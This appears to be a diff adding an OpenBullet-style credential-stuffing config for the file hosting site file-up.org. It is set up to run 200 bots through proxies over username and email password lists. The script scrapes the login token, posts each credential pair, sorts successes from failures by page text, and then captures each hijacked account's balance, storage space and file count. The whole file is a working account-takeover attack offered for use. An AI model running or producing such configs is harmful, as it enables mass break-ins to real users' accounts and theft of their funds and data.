@@ -1,0 +1,63 @@
+[SETTINGS]
+{
+  "Name": "File-Upload",
+  "SuggestedBots": 200,
+  "LastModified": "2019-04-11T15:59:13.9024858+02:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "Author": "xX-365094-Xx",
+  "Version": "1.2.8 Anomaly",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "EmailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.file-up.org/login.html" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "referer: https://www.file-up.org/" 
+PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"token\" value=\"" "\">" -> VAR "KEY" 
+REQUEST POST "https://www.file-up.org/" 
+  CONTENT "op=login&token=<KEY&rand=&redirect=https%3A%2F%2Fwww.file-up.org%2F&login=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.file-up.org" 
+  HEADER "referer: https://www.file-up.org/login.html" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect Login or Password" 
+    KEY ">login<" 
+  KEYCHAIN Success OR 
+    KEY ">My Account<" 
+REQUEST GET "https://www.file-up.org/?op=my_account" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+#CAPTURE_SOLDE PARSE "<SOURCE>" CSS "#tab_1 > div.row > div:nth-child(1) > div > div.display > div.number > h3" "innerHTML" -> CAP "SOLDE" 
+#CAPTURE_SPACE PARSE "<SOURCE>" CSS "#tab_1 > div.row > div:nth-child(2) > div > div.display > div.number > h3" "innerHTML" -> CAP "ESPACE" 
+REQUEST GET "https://www.file-up.org/?op=my_files" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+#capture_files PARSE "<SOURCE>" CSS "body > section > div > form > div > div.col-sm-4 > div.dashboard-stat2 > div.display > div.number > h3" "innerHTML" -> CAP "Nombre de fichier" 
